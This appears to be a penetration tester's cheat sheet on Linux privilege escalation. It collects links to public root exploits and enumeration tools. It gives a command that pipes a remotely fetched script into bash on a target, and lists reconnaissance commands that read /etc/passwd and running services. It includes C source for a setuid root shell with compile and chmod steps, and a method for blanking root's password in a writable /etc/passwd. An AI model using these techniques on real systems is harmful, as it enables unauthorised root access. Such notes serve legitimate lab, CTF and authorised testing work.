# Privilege Escalation
- - - -
## Guides
[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

- - - -
## Related
[GTFOBins](https://gtfobins.github.io/#)

- - - -
## Public exploits
### Dirty COW
Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel
[Dirty COW (CVE-2016-5195)](https://dirtycow.ninja)

### Rational Love
glibc - 'getcwd()' Local Privilege Escalation 2018 local root exploit
[local-root-exploits/linux/CVE-2018-1000001 at master · 5H311-1NJ3C706/local-root-exploits · GitHub](https://github.com/5H311-1NJ3C706/local-root-exploits/tree/master/linux/CVE-2018-1000001)

- - - -
## Tools
### LinEnum.sh
> Scripted Local Linux Enumeration & Privilege Escalation Checks  
[GitHub - rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

```
-t		Include thorough (lengthy) tests
```

Execute on target:
`curl <local-ip>:<port>/LinEnum.sh | bash`

### Linux Smart Enumeration (LSE)
> Linux enumeration tool for pentesting and CTFs with verbosity levels  
[GitHub - diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

### linux exploit suggester
Linux privilege escalation auditing tool
[GitHub - mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

### linuxprivchecker.py
A Linux Privilege Escalation Check Script
[GitHub - sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

### Unix-privesc-check
[unix-privesc-check | Penetration Testing Tools](https://tools.kali.org/vulnerability-analysis/unix-privesc-check)

- - - -
## Manual information gathering
### Operating system
`cat /etc/*-release`
`uname -i`
`uname -a`

### Users
`id`
`pwd`

`cat /etc/passwd` 
-> check for anything above id 1000

`grep -vE "nologin|false" /etc/passwd`

### Groups
Interesting unix groups
`44(video)` <- has access to video output (weird stuff)
`6(disk)` <- has raw access to the file system, read disk using e.g. `debugfs`

### Processing running
`ps aux` 
-> Is there something special, maybe related to the users found?

### Network
`netstat -antup`
-> Is any service running, we missed in the port scan (firewall?)

### Packages
`dpkg -l`

Check for manually installed stuff
`/var/`
`/opt/`
`/usr/local/src`
`/usr/src`
`/home/<username>`

- - - -
## Weak services
look for files that have root privileges but are writeable for everyone -> replace file with exploit´

- - - -
## check tools potentially vulnerable to priv esc?
`which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`

- - - -
## setuid
Check if available
`mount` -> must **not** `nosuid`

setuid.c
```c
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

alternative setuid.c
```c
int main(int argc, char *argv[]) {
    setreuid(0, 0);
    execve("/bin/sh", NULL, NULL);
}
```

`gcc setuid.c -o setuid`
`chown root:root /tmp/setuid; chmod 4755 /tmp/setuid`

- - - -
## writable /etc/passwd
change root, remove the "x" (password flag):
`root:x:0:0:root:/root:/bin/bash` -> `root::0:0:root:/root:/bin/bash`

`su`
-> root

[linux - Privilege escalation using passwd file - Information Security Stack Exchange](https://security.stackexchange.com/a/170335/189482)

- - - -